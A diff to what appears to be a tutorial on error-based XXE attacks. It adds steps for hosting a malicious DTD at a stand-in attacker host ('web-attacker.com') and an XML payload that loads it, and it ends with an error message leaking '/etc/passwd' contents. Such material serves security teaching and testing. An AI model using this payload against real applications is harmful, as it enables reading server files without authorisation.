@@ -13,6 +13,15 @@ This DTD carries out the following steps:
 - Uses the `eval` entity, which causes the dynamic declaration of the `error` entity to be performed.
 - Uses the `error` entity, so that its value is evaluated by attempting to load the nonexistent file, resulting in an error message containing the name of the nonexistent file, which is the contents of the `/etc/passwd` file.
 
+The attacker must then host the malicious DTD on a system they control. For example, the attacker might serve it at the following URL: `https://web-attacker.com/malicious.dtd`.
+
+Finally, the attacker must submit the following XXE payload to the vulnerable application:
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
+"http://web-attacker.com/malicious.dtd"> %xxe;]>
+<stockCheck><productId>299</productId></stockCheck>
+```
 Invoking the malicious external DTD will result in an error message like the following:
 ```txt
 java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
